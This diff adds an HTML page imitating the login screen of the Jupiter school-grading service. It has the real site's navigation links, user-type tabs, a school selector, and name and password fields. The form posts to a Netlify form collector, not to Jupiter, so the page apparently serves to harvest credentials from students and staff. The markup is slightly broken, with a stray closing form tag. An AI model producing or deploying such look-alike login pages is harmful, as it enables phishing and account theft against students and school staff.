@@ -1,1 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Jupiter Login</title>
+  <link rel="stylesheet" href="styles.css"/>
+</head>
+<body>
+  <header>
+    <div class="logo">🌐 JUPITER</div>
+    <nav>
+      <a href="https://login.jupitered.com/login/index.php">Español</a>
+      <a href="https://login.jupitered.com/help/video.php?studlogin">Video Tour</a>
+      <a href="https://jupitered.com/privacy.html">Privacy</a>
+      <a href="https://jupitered.com/?home=1">About</a>
+    </nav>
+  </header>
 
+  <main>
+    <div class="login-box">
+      <div class="tabs">
+        <a href="student.html"><button class="tab">Student</button></a>
+        <button class="tab">Parent</button>
+        <button class="tab">Sub</button>
+        <button class="tab">TA</button>
+        <button class="tab active">Staff</button>
+      </div>
+
+</form>
+      <form method="POST" data-netlify="true">
+        <input type="text" placeholder="Name or ID" />
+        <input type="password" placeholder="Password" />
+        <select>
+          <option>Millennium High School</option>
+          <option>Other School...</option>
+        </select>
+        <div class="buttons">
+          <button type="button" class="help-btn">Help Me Login</button>
+          <button type="submit" class="login-btn">Login</button>
+        </div>
+      </form>
+    </div>
+  </main>
+</body>
+</html>
